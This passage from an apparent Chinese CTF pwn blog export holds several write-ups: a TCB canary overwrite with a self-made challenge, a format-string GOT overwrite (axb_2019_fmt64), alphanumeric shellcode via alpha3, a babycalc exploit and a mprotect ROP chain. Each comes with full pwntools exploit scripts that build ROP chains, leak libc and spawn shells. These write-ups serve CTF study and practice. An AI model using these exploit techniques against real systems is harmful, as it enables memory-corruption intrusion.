b&#x27;a&#x27;*0x50+p64(ret_addr)+p64(rdi_addr)+p64(binsh_addr)+p64(system_addr)io.send(payload)io.interactive()","categories":[{"name":"wp","slug":"wp","permalink":"http://example.com/categories/wp/"}],"tags":[]},{"title":"修改TCB来绕过canary","slug":"修改TCB来绕过canary","date":"2023-02-17T12:54:29.000Z","updated":"2023-02-17T16:00:01.224Z","comments":true,"path":"2023/02/17/修改TCB来绕过canary/","link":"","permalink":"http://example.com/2023/02/17/%E4%BF%AE%E6%94%B9TCB%E6%9D%A5%E7%BB%95%E8%BF%87canary/","excerpt":"","text":"以往做过的开启了canary保护的题目 一般都是通过格式化字符串泄露 从而来绕过canary 最近在学习免杀的时候 意外了解了canary的生成机制 从而就有了今天的这一篇文章 总体下来还是收获颇丰 什么是canary由于c语言并没有检查数组的下标 所以其存在溢出的可能性 诱发了栈溢出漏洞 可以使得攻击者任意的控制程序执行流 对此 canary机制有效预防了栈溢出的操作 其通过在栈帧的bp寄存器间隔一个字长(往低地址方向)的地方存放了一串随机数(末位为\\x00 目的是防止被printf等函数泄露) 在函数结束前 进行了一个异或检查 如果发现此地址处的canary被修改了 那么则判定为发生了栈溢出的行为 则会跳转到**___stack_chk_fail**函数 该函数负责输出错误信息并且终止程序 函数栈帧在形成初期 从 fs:0x28 赋值 并将其入栈 函数结束前进行异或判定 如果结尾为0 就通过jz指令跳转到 leave|ret 指令处返回父栈帧 否则就调用**___stack_chk_fail**函数结束程序 而在libc2.23及以下的版本中 ___stack_chk_fail函数会根据argv[0]存放的程序路径来输出下面这样的错误信息 12345#include&lt;stdio.h&gt;int main()&#123; char a[0x20]; read(0,a,0x30);&#125; 而argv[0]位于当前栈帧的栈底 可以通过溢出篡改其为flag 从而获取flag 这里直接在源码中修改argv[0] 看看效果 123456#include&lt;stdio.h&gt;int main(int argc,char **argv)&#123; char a[20]; argv[0]=&quot;hello,world&quot;; read(0,a,0x30);&#125; 不过 要注意的是 其输出的是路径 也就是字符串 而非输出该路径对应文件的内容 接着我们更换一下libc 文件 使其为libc2.27再次尝试 源码不变 可以发现其直接默认输出unknown了 同时这里发现了一个有趣的现象 到达一定长度后 溢出的数据会被当作指令执行 这就需要进一步研究了 不过由于我实在是太心急把这篇文章写出来 所以暂时是先咕咕了 后续会开一个新篇章研究这个现象 上述稍微跑题了一下 说回canary 栈上的canary是由 fs:28h 处提供的值 我们对这个地址朔源一下 fs是一个寄存器 其指向当前活动线程的TEB结构 TEB是一个线程环境块 进程中每个线程都对应着一个TEB结构体 其存储了线程的各种信息 不同的偏移对应着不同的信息 123456789101112000 指向SEH链指针004 线程堆栈顶部008 线程堆栈底部00C SubSystemTib010 FiberData014 ArbitraryUserPointer018 FS段寄存器在内存中的镜像地址020 进程PID024 线程ID02C 指向线程局部存储指针030 PEB结构地址（进程结构）034 上个错误号 但是fs中存放的TEB地址需要经过解析之后才能显示 调用pthread_self函数就可以获取到TEB的位置 可以在对应位置找到canary 而canary判断是否被更改 是将栈上的和这里的进行比较 如果我们修改了TEB上的canary 那么栈上的canary就可以很轻易的被我们绕过 那么TEB上的canary又是从何而来呢 这就要从内核的_dl_random说起了 其是一个地址 用来指向内核中存储随机数的地方 该随机数初始化于动态链接之前 其存放于auxiliary vector 数组中 该数组是用来辅助程序运行的数据数组 其在dl_main函数中被调用 12345678910111213141516ElfW(Addr)_dl_sysdep_start (void **start_argptr, void (*dl_main) (const ElfW(Phdr) *phdr, ElfW(Word) phnum, ElfW(Addr) *user_entry, ElfW(auxv_t) *auxv))&#123; ... DL_FIND_ARG_COMPONENTS (start_argptr, _dl_argc, _dl_argv, _environ, GLRO(dl_auxv)); for (av = GLRO(dl_auxv); av-&gt;a_type != AT_NULL; set_seen (av++)) ... case AT_RANDOM: _dl_random = (void *) av-&gt;a_un.a_val; break; ... ...&#125; 接着是__libc_start_main函数 其生成canary的源码如下 1234567891011121314151617181920212223// sysdeps\\unix\\sysv\\linux\\dl-osinfo.hstatic inline uintptr_t __attribute__ ((always_inline))_dl_setup_stack_chk_guard (void *dl_random)&#123; union &#123; uintptr_t num; unsigned char bytes[sizeof (uintptr_t)]; &#125; ret; /* We need in the moment only 8 bytes on 32-bit platforms and 16 bytes on 64-bit platforms. Therefore we can use the data directly and not use the kernel-provided data to seed a PRNG. */ memcpy (ret.bytes, dl_random, sizeof (ret));#if BYTE_ORDER == LITTLE_ENDIAN ret.num &amp;= ~(uintptr_t) 0xff;#elif BYTE_ORDER == BIG_ENDIAN ret.num &amp;= ~((uintptr_t) 0xff &lt;&lt; (8 * (sizeof (ret) - 1)));#else# error &quot;BYTE_ORDER unknown&quot;#endif return ret.num;&#125; canary的值和dl_random一致 只不过在最后一个字节强制使其为\\x00 接着来到_libc_start_init函数 1234567 /* Set up the stack checker&#x27;s canary. */ uintptr_t stack_chk_guard = _dl_setup_stack_chk_guard (_dl_random);# ifdef THREAD_SET_STACK_GUARD THREAD_SET_STACK_GUARD (stack_chk_guard);# else __stack_chk_guard = stack_chk_guard;# endif 如果设置了THREAD_SET_STACK_GUARD宏 那么canary就会被设置进入线程局部存储 PS:一直没有搞清楚TEB TCB pthread三者的关系 上述的描述可能存在很大问题 更详细的源码级别可以看这篇博客 以我的水平很难对其进行复述 浅析 Linux 程序的 Canary 机制 | Kiprey’s Blog 在gdb中我们修改其值为0 接下一路n到函数结束前的canary判断 此时只要rcx寄存器中的值与fs:0x28中的值相同 就会触发je指令 正常结束栈帧 但是显然 此时rcx寄存器保存的是在函数最开始入栈的旧canary值 而此时fs:0x28处的值已经被我们修改为0 如果此时进行xor 显然结果是不会为0 我们再次更改一下rcx寄存器的值 并且执行这一步异或 此时eflags寄存器的值为 其二进制形式为1001000110 ZF标志位是1 那么jz指令就会跳转 于是就不会触发__stack_chk_fail函数 所以我们成功绕过了canary 上述的绕过是基于修改主TCB中的canary 还有一种办法是修改子线程的TCB 这里不做说明 题目实例网上没有找到利用到这个知识点的题目 索性自己出了一题 233 题目源码、附件和exp在文件末尾提供 有兴趣的师傅可以试一试 编译环境ubuntu18.04 libc2.27 开启了沙盒和canary保护 ida打开 一共有三个值得注意的函数 123456789101112131415int __cdecl main(int argc, const char **argv, const char **envp)&#123; __int64 v4; // [rsp+8h] [rbp-38h] void *retaddr; // [rsp+48h] [rbp+8h] BYREF v4 = seccomp_init(2147418112LL, argv, envp); seccomp_rule_add(v4, 0LL, 59LL, 0LL); seccomp_load(v4); setvbuf(_bss_start, 0LL, 2, 0LL); setvbuf(stdin, 0LL, 2, 0LL); write(1, &quot;I&#x27;m Captain Nanhe\\n&quot;, 0x12uLL); write(1, &quot;Say some old spells to start the journey\\n&quot;, 0x29uLL); read(0, &amp;retaddr, 0x15uLL); return 1;&#125; 123456789101112131415unsigned __int64 vuln()&#123; void *buf; // [rsp+0h] [rbp-C0h] BYREF char v2[24]; // [rsp+A0h] [rbp-20h] BYREF unsigned __int64 v3; // [rsp+B8h] [rbp-8h] v3 = __readfsqword(0x28u); write(1, &quot;Tell me the location of the Eye of the Deep Sea\\n&quot;, 0x30uLL); read(0, &amp;buf, 8uLL); write(1, &quot;I have magic\\n&quot;, 0xDuLL); read(0, buf, 8uLL); write(1, &quot;Let&#x27;s go!\\n&quot;, 0xAuLL); read(0, v2, 0x100uLL); return __readfsqword(0x28u) ^ v3;&#125; 123456.text:0000000000400817 hint proc near.text:0000000000400817 ; __unwind &#123;.text:0000000000400817 push rbp.text:0000000000400818 mov rbp, rsp.text:000000000040081B jmp rsp.text:000000000040081B hint endp 其中hint函数是由内联汇编写的 所以ida反编译出来的伪代码为啥参考性 首先来分析main函数 read读入的地址是直接从ret addr开始的 一共可以读入0x16字节的数据 再联想到hint函数提供了一个汇编指令 jmp rsp 那么显然这里的read是用来手写shellcode并且执行的 来分析一下main函数执行leave|ret 时各个寄存器的值 main函数的最后 我用patch修改了寄存器的赋值 1234567.text:00000000004009DB mov rax, 1.text:00000000004009E2 mov rdi, rax.text:00000000004009E5 mov esi, 0.text:00000000004009EA mov rcx, [rbp+var_8].text:00000000004009EE xor rcx, fs:28h.text:00000000004009F7 jz short locret_4009FE.text:00000000004009F9 call ___stack_chk_fail 此时rax&#x3D;1 rdi&#x3D;1 rdx&#x3D;21 esi&#x3D; 0 去掉覆盖retaddr所需要的8个字节 我们还剩下13个字节用来编写shellcode 如果这里想用构造read以此来读入更多的字节从而在这里就直接获取flag 会因为字节不够而失败 12345678910shellcode = &quot;&quot;&quot;xor eax,eaxxor edi,edimov rsi,0x601080+0x100syscallpush 0x400820ret&quot;&quot;&quot;print(len(asm(shellcode)))#19 而如果我们在这里将rsi赋值为write函数的got表 随后syscall 就可以调用write函数泄露基址 随后我们将vuln函数的地址入栈 接着触发ret指令 就可以跳转到vuln函数 123456shellcode = &quot;&quot;&quot;mov esi,0x601028syscallpush 0x400820ret&quot;&quot;&quot; 接着来看vuln函数 其给了我们向任意地址写入8个字节数据的机会 随后又给了一次栈溢出的机会 但是程序开启了canary保护 并且开启了沙盒 如果我们此时想要使用onegadget来覆盖哪个函数的got表的话显然是行不通的 直接利用栈溢出构造orw的话也会因为canary而无法实现 于是这里的任意写就用来向TEB结构体中的canary覆盖掉 但是我们想要进行orw的rop链构造 还需要找个地址写入.&#x2F;flag字符串 所以我们利用栈溢出再次返回到vuln函数 再次利用一次任意写 在bss段上写入.&#x2F;flag 最后就可以成功获取flag 完整exp: 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455from pwn import *context.log_level = &#x27;debug&#x27;io=process(&#x27;./test&#x27;)elf = ELF(&#x27;./test&#x27;)libc = ELF(&#x27;./locate&#x27;)context.arch = &quot;amd64&quot;context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]io.recvuntil(&quot;Say some old spells to start the journey&quot;)jmp_rsp = 0x40081Bwrite_got = 0x601028vuln_addr = 0x400820shellcode = &quot;&quot;&quot;mov esi,0x601028syscallpush 0x400820ret&quot;&quot;&quot;payload = p64(jmp_rsp)+asm(shellcode)io.send(payload)write_addr = u64(io.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,b&#x27;\\x00&#x27;))success(&quot;write_addr :&quot;+hex(write_addr))libc_addr = write_addr - libc.sym[&#x27;write&#x27;]success(&quot;libc_addr :&quot;+hex(libc_addr))pthread_self = libc_addr + (0x7f61612d8740-0x7f6160ab9000)success(&quot;pthread_self :&quot;+hex(pthread_self))canary_addr = pthread_self+5*0x8success(&quot;canary_addr :&quot;+hex(canary_addr))io.recvuntil(&quot;Tell me the location of the Eye of the Deep Sea&quot;)io.send(p64(canary_addr))io.recvuntil(&quot;I have magic&quot;)io.send(p64(0x100))io.recvuntil(&quot;Let&#x27;s go!&quot;)payload = p64(0x100)*5+p64(vuln_addr)io.sendline(payload)io.recvuntil(&quot;Tell me the location of the Eye of the Deep Sea&quot;)flag_addr = 0x601070bss_addr = 0x601060io.send(p64(flag_addr))io.recvuntil(&quot;I have magic&quot;)io.send(b&#x27;./flag\\x00\\x00&#x27;)io.recvuntil(&quot;Let&#x27;s go!&quot;)rdi_addr = 0x0000000000400a63rsi_addr = libc_addr + 0x0000000000023a6aopen_addr = libc_addr + libc.sym[&#x27;open&#x27;]rdx_addr = libc_addr + 0x0000000000001b96puts_addr = libc_addr + libc.sym[&#x27;puts&#x27;]read_addr = libc_addr + libc.sym[&#x27;read&#x27;]payload = p64(0x100)*5payload += p64(rdi_addr)+p64(flag_addr)+p64(rsi_addr)+p64(0)+p64(open_addr)payload += p64(rdi_addr)+p64(3)+p64(rsi_addr)+p64(bss_addr+0x100)+p64(rdx_addr)+p64(0x30)+p64(read_addr)payload += p64(rdi_addr)+p64(bss_addr+0x100)+p64(puts_addr)io.sendline(payload)io.recv()io.recv() 题目源码: 12345678910111213141516171819202122232425262728293031323334#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;#include&lt;seccomp.h&gt;void hint()&#123; asm( &quot;jmp %rsp\\n\\t&quot; );&#125;void vuln()&#123; char *c[20]; char b[20]; write(1,&quot;Tell me the location of the Eye of the Deep Sea\\n&quot;,48); read(0,c,0x8); write(1,&quot;I have magic\\n&quot;,13); read(0,*c,0x8); write(1,&quot;Let&#x27;s go!\\n&quot;,10); read(0,b,0x100);&#125;int main()&#123; scmp_filter_ctx ctx; ctx =seccomp_init(SCMP_ACT_ALLOW); seccomp_rule_add(ctx,SCMP_ACT_KILL,SCMP_SYS(execve),0); seccomp_load(ctx); setvbuf(stdout, 0, 2, 0); setvbuf(stdin, 0, 2, 0); char a[0x20]; write(1,&quot;I&#x27;m Captain Nanhe\\n&quot;,18); write(1,&quot;Say some old spells to start the journey\\n&quot;,41); read(0,a+0x38,21); asm( &quot;mov $1,%rax\\n\\t&quot; &quot;mov %rax,%rdi\\n\\t&quot; );&#125; 题目附件和libc文件链接: 12链接: https://pan.baidu.com/s/1bBsZuq9iKhBilwjkmVX9Mw?pwd=chen 提取码: chen 链接: https://pan.baidu.com/s/1DXnWUdWdnshfChysdxjXuQ?pwd=chen 提取码: chen 题目编译指令: 1gcc -z execstack -fstack-protector -no-pie -z lazy -o test a.c -lseccomp","categories":[{"name":"栈","slug":"栈","permalink":"http://example.com/categories/%E6%A0%88/"}],"tags":[]},{"title":"axb_2019_fmt64","slug":"axb-2019-fmt64","date":"2023-02-15T14:38:29.000Z","updated":"2023-02-16T04:36:07.463Z","comments":true,"path":"2023/02/15/axb-2019-fmt64/","link":"","permalink":"http://example.com/2023/02/15/axb-2019-fmt64/","excerpt":"","text":"这题收获还是很大的 学会了自己构造任意写的格式化字符串漏洞payload checksec看一下保护机制 1234567[!] Could not populate PLT: invalid syntax (unicorn.py, line 110)[*] &#x27;/home/chen/pwn&#x27; Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) ida查看一下反汇编代码 1234567891011121314151617181920212223242526272829int __cdecl __noreturn main(int argc, const char **argv, const char **envp)&#123; char s[272]; // [rsp+10h] [rbp-250h] BYREF char format[312]; // [rsp+120h] [rbp-140h] BYREF unsigned __int64 v5; // [rsp+258h] [rbp-8h] v5 = __readfsqword(0x28u); setbuf(stdout, 0LL); setbuf(stdin, 0LL); setbuf(stderr, 0LL); puts( &quot;Hello,I am a computer Repeater updated.\\n&quot; &quot;After a lot of machine learning,I know that the essence of man is a reread machine!&quot;); puts(&quot;So I&#x27;ll answer whatever you say!&quot;); while ( 1 ) &#123; alarm(3u); memset(s, 0, 0x101uLL); memset(format, 0, 0x12CuLL); printf(&quot;Please tell me:&quot;); read(0, s, 0x100uLL); sprintf(format, &quot;Repeater:%s\\n&quot;, s); if ( (unsigned int)strlen(format) &gt; 0x10E ) break; printf(format); &#125; printf(&quot;what you input is really long!&quot;); exit(0);&#125; 很常规的64位格式化字符串 但是多了个函数alarm 限制了进程持续的时间 如果我们使用pwntools内置的函数fmtstr_payload来生成payload的话 会由于字节过多发送失败 所以这里尝试一下自己构造 12345678910111213141516171819202122from pwn import*from struct import pack#io = remote(&quot;node4.buuoj.cn&quot;,26248)io = process(&quot;./pwn&quot;)context.log_level = &quot;debug&quot;elf = ELF(&quot;./pwn&quot;)#libc = ELF(&quot;./buu_libc_ubuntu16_64&quot;)libc = ELF(&quot;./locate&quot;)context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]context.arch = &quot;amd64&quot;def debug(): gdb.attach(io) pause()io.recvuntil(&quot;Please tell me:&quot;)#gdb.attach(io,&#x27;b *0x400957&#x27;)payload = b&#x27;%9$saaaa&#x27;+p64(elf.got[&#x27;puts&#x27;])io.sendline(payload)puts_addr = u64(io.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,b&#x27;\\x00&#x27;))success(hex(puts_addr))libc_addr = puts_addr - libc.sym[&#x27;puts&#x27;]success(hex(libc_addr)) 泄露libc基址很简单 只要注意一下64位的p64会附带\\x00 导致printf读取到后直接截断了 无法正常泄露 得把p64放在后面 接下来的难点在于说如何任意地址写 这题要获取shell的办法无非就是覆盖函数的got表 修改为system 随后参数设置为&#x2F;bin&#x2F;sh 或者是onegadget 而格式化字符串任意写是依靠%x$n 这个格式符是将其前面输出的字节赋值到对应的偏移地址 如果我们想要任意写的只是小额的数值 我们可以这样构造payload 12payload = b&#x27;a&#x27;*padding+b&#x27;%$xn&#x27;+p64(ptr_addr)# 其中padding是想要修改的数值 x是varge参数的偏移 但是如果我们想要赋值onegadget到exit函数的got表 那么可想而知 需要庞大的字节数 不仅仅题目很少会给我们无限制的读入数据 如此庞大的数据还会导致程序运行缓慢 何况这题还调用了alarm函数 那么换个想法 如果我们只是修改单字节或者是双字节呢? 因为每个函数的真实地址差别只在于最后几个字节 前面的都是一样的 这样就可以大大减少需要的字节数 对于一个地址来说 其在内存一共占用了8个字节 而每个字节都存放着相应的数值 比如说下图 0x7f7458560971处的内容就是0x55 我们对比一下got表中存放的真实地址 发现只有后5位是不一样的 不过由于没有办法单独修改1位 所以我们需要修改后三个字节的数据 我们知道在n前面添加一个h就可以减半要操作的字节数 %$xhhn就可以做到修改单字节的数据 所以只能修改2的倍数的字节 要想修改三个字节的话 我们需要修改两次 一次修改单字节 一次修改双字节 接下来还有一个问题在于 函数的真实地址每次程序运行的时候都会变化 我们肉眼当然是可以读出地址的后三位 但是要如何利用脚本来实现读取呢? 这里介绍一下算术右移和与运算 算术右移: 对于一个二进制数 例如11110000来说 其符号位为1 如果是逻辑右移的话 不需要考虑符号位 而算术右移 如果符号位是1的话 就需要用1来补全 反之 用0来补全 比如算术右移3 那么这个二进制数就会变成 (1)(1)(1)11110 括号的表示是补全的 与运算: 二进制数a 10101010 二进制数b 11111111 二者进行与运算的话 对应的位依次进行比较 如果两个位都是1的话 那么与运算之后的结果就是1 除此之外的所有情况 与运算后的结果都是0 那么a和b与运算后的结果就是 10101010 与运算的作用在于 如果我们是和0xff来与运算 其二进制数是11111111 就会保留与之运算的数的最后一个字节的值 比如: 1234system_addr =0x7fb60fe40420# 11111111 10110110 00001111 11100100 00000100 00100000 system_addr# 00000000 00000000 00000000 00000000 11111111 11111111 0xffff# 00000000 00000000 00000000 00000000 00000100 00100000 0x0420 用system_addr去和0xffff与运算 最后得到的结果就是0x0420 为system_addr的最后两个字节 如果再用上算术右移 那么我们就可以获取到倒数第三个字节的值 12345system_addr =0x7fb60fe40420# 11111111 10110110 00001111 11100100 00000100 00100000 system_addr# 11111111 11111111 11111111 10110110 00001111 11100100 system_addr &gt;&gt; 16# 00000000 00000000 00000000 00000000 00000000 11111111 0xff# 00000000 00000000 00000000 00000000 00000000 11100100 0xe4 最后得到的值就是system_addr的倒数第三个字节 至于输出足够的字节来使%n读取到从而任意写 则是采用%c这个格式化字符 其作用是输出x个字节 如果不够则用\\x00补齐 比如 printf(“%10c”) 就会输出10个空字符 那么最后的payload就是这样构造 123payload = b&#x27;%&#x27;+str(high_addr-9).encode()+b&#x27;c%12$hhn&#x27;+b&#x27;%&#x27;+str(low_addr-high_addr).encode()+b&#x27;c%13$hn&#x27;payload = payload.ljust(32,b&#x27;\\x00&#x27;)payload += p64(strlen_got+2)+p64(strlen_got) %n是在其之前输出了多少字节的字符就将对应值赋给对应的地址 而在这一题中 先行输出了 “Repeater:” 所以需要-9 而encode()则是在python3中需要发送byte型的数据 所以需要进行转化 随后的low_addr-high_addr也是同理 完整exp: 12345678910111213141516171819202122232425262728293031323334353637383940from pwn import*from struct import pack#io = remote(&quot;node4.buuoj.cn&quot;,26248)io = process(&quot;./pwn&quot;)context.log_level = &quot;debug&quot;elf = ELF(&quot;./pwn&quot;)#libc = ELF(&quot;./buu_libc_ubuntu16_64&quot;)libc = ELF(&quot;./locate&quot;)context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]context.arch = &quot;amd64&quot;def debug(): gdb.attach(io) pause()io.recvuntil(&quot;Please tell me:&quot;)#gdb.attach(io,&#x27;b *0x400957&#x27;)payload = b&#x27;%9$saaaa&#x27;+p64(elf.got[&#x27;puts&#x27;])io.sendline(payload)puts_addr = u64(io.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,b&#x27;\\x00&#x27;))success(hex(puts_addr))libc_addr = puts_addr - libc.sym[&#x27;puts&#x27;]success(hex(libc_addr))io.recvuntil(&quot;Please tell me:&quot;)printf_got = elf.got[&#x27;printf&#x27;]strlen_got = elf.got[&#x27;strlen&#x27;]alarm_got = elf.got[&#x27;alarm&#x27;]strlen_got = elf.got[&#x27;strlen&#x27;]alarm_addr = libc_addr + libc.sym[&#x27;alarm&#x27;]system_addr = libc_addr + libc.sym[&#x27;system&#x27;]#7a4420onegadget_addr = libc_addr + 0xf02a4high_addr = (onegadget_addr&gt;&gt;16)&amp;0xfflow_addr = onegadget_addr&amp;0xffffpayload = b&#x27;%&#x27;+str(high_addr-9).encode()+b&#x27;c%12$hhn&#x27;+b&#x27;%&#x27;+str(low_addr-high_addr).encode()+b&#x27;c%13$hn&#x27;payload = payload.ljust(32,b&#x27;\\x00&#x27;)payload += p64(strlen_got+2)+p64(strlen_got)io.sendline(payload)io.recvuntil(&quot;Please tell me:&quot;)io.sendline(b&#x27;aaaa&#x27;)io.interactive()","categories":[{"name":"wp","slug":"wp","permalink":"http://example.com/categories/wp/"}],"tags":[]},{"title":"可见字符shellcode","slug":"可见字符shellcode","date":"2023-02-11T13:18:37.000Z","updated":"2023-02-11T14:28:13.441Z","comments":true,"path":"2023/02/11/可见字符shellcode/","link":"","permalink":"http://example.com/2023/02/11/%E5%8F%AF%E8%A7%81%E5%AD%97%E7%AC%A6shellcode/","excerpt":"","text":"利用pwntools自带的shellcraft生成的shellcode 所消耗的字节数比较多 并且还含有很多的不可见字符 123456from pwn import*context.arch = &quot;amd64&quot;io = process(&quot;./pwn&quot;)context.log_level = &quot;debug&quot;shellcode = asm(shellcraft.sh())io.send(shellcode) 有些题目会对症下药 限制shellcode长度的题目已经屡见不鲜 本篇文章来讲一下限制字符范围的shellcode 国际上普遍采用ascii码作为字符的编码 其中规定了95个可见字符 即打印字符 可以被直接输出 剩下的则是不可见的字符 而pwn题中的可见字符shellcode通常指使用可见字符构成的shellcode 这里我们需要借用alpha3这款工具来将一串不可见的字符shellcode转化为可见字符 手动转化的办法这里就不介绍了 毕竟我也不会 哪天学会了再补充吧 由于官方的alpha3只支持win32 在linux系统中会出现报错 需要我们修改源码 比较麻烦 再加上需要我们自己编译 所以这里直接采用这个师傅的修改版进行下载使用 1https://blog.csdn.net/SmalOSnail/article/details/105236336 下载指令: 1git clone https://github.com/TaQini/alpha3.git 其内置了两个脚本和两个文本文件 各自对应32位和64位系统的shellcode生成脚本 我们只需要修改shellcode文本文件中的shellcode 并且指定shellcode的基地址后运行脚本 这里使用open read write函数来写入shellcode 123456from pwn import*context.arch = &quot;amd64&quot;f = open(&quot;/home/chen/alpha3/shellcode&quot;, &#x27;w&#x27;)shellcode = asm(shellcraft.sh())f.write(shellcode)f.close() 用python2运行就好了 3的话区分了str和byte型 会导致write出错 随后cd到alpha3目录下 .&#x2F;shellcode_x??.sh shellcode基地址 这个基地址要怎么看 以mrctf2020_shellcode_revenge这一题为例 其将shellcode的地址赋值给了rax寄存器 那么call rax 就是调用shellcode 所以我们这里的shellcode基地址应该是rax","categories":[{"name":"栈","slug":"栈","permalink":"http://example.com/categories/%E6%A0%88/"}],"tags":[]},{"title":"2023西湖论剑calc","slug":"2023西湖论剑calc","date":"2023-02-05T10:08:55.000Z","updated":"2023-02-08T06:16:32.636Z","comments":true,"path":"2023/02/05/2023西湖论剑calc/","link":"","permalink":"http://example.com/2023/02/05/2023%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91calc/","excerpt":"","text":"本次wp首次尝试使用视频方式表示 视频地址：2022西湖论剑 babycalc复现_哔哩哔哩_bilibili exp: 12345678910111213141516171819202122232425262728293031323334353637383940from pwn import*io = process(&quot;./pwn&quot;)#io = remote(&quot;1.14.71.254&quot;,28066)context.log_level = &quot;debug&quot;context.arch = &quot;amd64&quot;#context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]elf = ELF(&quot;./pwn&quot;)#libc = ELF(&quot;buu_libc_ubuntu16_64&quot;)libc = ELF(&quot;./locate_libc2.23&quot;)io.recvuntil(&quot;:&quot;)ret_addr = 0x4005b9rdi_addr = 0x400ca3rsi_r15_addr = 0x400ca1bss_addr = 0x602510rsp_r13_r14_r15_addr = 0x400c9dread_plt = 0x4005f0read_got = elf.got[&#x27;read&#x27;]puts_plt = 0x4005d0#key = p64(0xa111423746352413)+p64(0x318c77665d48332)payload = b&#x27;24&#x27;+cyclic(0x6)+p64(ret_addr)*17payload += p64(rdi_addr)+p64(0)+p64(rsi_r15_addr)+p64(bss_addr)+p64(0)+p64(read_plt)+p64(rsp_r13_r14_r15_addr)+p64(bss_addr-0x18)payload += p8(19)+p8(36)+p8(53)+p8(70)+p8(55)+p8(66)+p8(17)+p8(161)+p8(50)+p8(131)+p8(212)+p8(101)+p8(118)+p8(199)+p8(24)+p8(3)#payload += keypayload = payload.ljust(0x100-0x4,b&#x27;\\x00&#x27;)payload += p32(0x38)#gdb.attach(io,&#x27;b *0x400BB8&#x27;)io.send(payload)payload = p64(rdi_addr)+p64(read_got)+p64(puts_plt)+p64(rdi_addr)+p64(0)+p64(rsi_r15_addr)+p64(bss_addr+0x48)+p64(0)+p64(read_plt)#gdb.attach(io,&#x27;b *0x400c9d&#x27;)io.sendline(payload)read_addr = u64(io.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,b&#x27;\\x00&#x27;))success(hex(read_addr))libc_addr = read_addr - libc.sym[&#x27;read&#x27;]success(hex(libc_addr))system_addr = libc_addr + libc.sym[&#x27;system&#x27;]binsh_addr = libc_addr + next(libc.search(b&quot;/bin/sh&quot;))payload = p64(ret_addr)+p64(rdi_addr)+p64(binsh_addr)+p64(system_addr)io.sendline(payload)io.interactive()","categories":[{"name":"wp","slug":"wp","permalink":"http://example.com/categories/wp/"}],"tags":[]},{"title":"mprotect修改bss段权限","slug":"mprotect修改bss段权限","date":"2023-02-04T14:02:29.000Z","updated":"2023-02-04T16:00:51.397Z","comments":true,"path":"2023/02/04/mprotect修改bss段权限/","link":"","permalink":"http://example.com/2023/02/04/mprotect%E4%BF%AE%E6%94%B9bss%E6%AE%B5%E6%9D%83%E9%99%90/","excerpt":"","text":"这一种办法一般来说不是很实用 当个额外的知识点扩展就好了 难免有的新生赛想考 在程序开启了NX保护的前提下 我们没有办法通过在bss段写入shellcode后覆盖ret addr为shellcode首地址来实现shell 这是因为bss段此时的执行权限为rw-p 意为可读可写 但不可执行 所以位于bss段的shellcode无法发挥作用 但是在c语言中存在一个mprotect函数 其作用为把自start开始的、长度为len的内存区的保护属性修改为prot指定的值 1mprotect(const void *start, size_t len, int prot) prot为7时 可以设置内存区域权限为rwx-p 即可读可写可执行 这样就能让shellcode起作用 下面来看一道例题加深理解 jarvisoj_level5checksec看一下保护机制 1234567[!] Could not populate PLT: future feature annotations is not defined (unicorn.py, line 2)[*] &#x27;/home/chen/pwn&#x27; Arch: amd64-64-little RELRO: No RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) 没开RELRO 但是开了NX ida看一下伪代码 12345int __cdecl main(int argc, const char **argv, const char **envp)&#123; vulnerable_function(); return write(1, &quot;Hello, World!\\n&quot;, 0xEuLL);&#125; 跟进一下vulnerable_function函数 1234567ssize_t vulnerable_function()&#123; char buf[128]; // [rsp+0h] [rbp-80h] BYREF write(1, &quot;Input:\\n&quot;, 7uLL); return read(0, buf, 0x200uLL);&#125; 有一次栈溢出的机会 不同于其他经典的ret2libc题目 这题的plt表只有read和write函数 由于write函数泄露函数真实地址需要控制三个寄存器 所以这里用csu的办法 123456789101112131415161718192021222324from pwn import*io = process(&quot;./pwn&quot;)#io = remote(&quot;node4.buuoj.cn&quot;,25692)context.log_level = &quot;debug&quot;context.arch = &quot;amd64&quot;context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]elf = ELF(&quot;./pwn&quot;)#libc = ELF(&quot;buu_libc_ubuntu16_64&quot;)libc = ELF(&quot;./locate_libc2.23&quot;)io.recvuntil(&quot;Input:&quot;)back_addr = 0x4005e6gadget1_addr = 0x400690gadget2_addr = 0x4006AAwrite_got = elf.got[&#x27;write&#x27;]bss_addr = 0x600A88+0x50payload = cyclic(0x80+0x8)+p64(gadget2_addr)payload += p64(0)+p64(1)+p64(write_got)+p64(0x8)+p64(write_got)+p64(1)+p64(gadget1_addr)payload += cyclic(56)+p64(back_addr)io.sendline(payload)write_addr = u64(io.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,b&#x27;\\x00&#x27;))success(hex(write_addr))libc_addr = write_addr - libc.sym[&#x27;write&#x27;]success(hex(libc_addr)) 接下来就是构造mprotect函数来实现bss段的权限修改 同时解答一下pop rsi和pop rdx两条指令哪来的 这题是动态链接 二进制文件中是不存在这两条指令的 但是如果题目有提供libc文件 也是可以ROPgadget查找libc文件的指令 前提是我们获取了libc基址 12345678io.recvuntil(&quot;Input:&quot;)mprotect_addr = libc_addr + libc.sym[&#x27;mprotect&#x27;]read_addr = libc_addr + libc.sym[&#x27;read&#x27;]rdi_addr = 0x4006b3rdx_addr = libc_addr + 0x1b92rsi_addr = libc_addr + 0x202f8payload = cyclic(0x80+0x8)+p64(rdi_addr)+p64(0x600000)+p64(rsi_addr)+p64(0x1000)+p64(rdx_addr)+p64(7)+p64(mprotect_addr)+p64(back_addr)io.sendline(payload) gdb动调看一下mprotect函数是否生效 可以看到0x600000-0x601000的内存区域权限已经被修改为rwxp 可读可写可执行了 那么接下来我们构造read函数 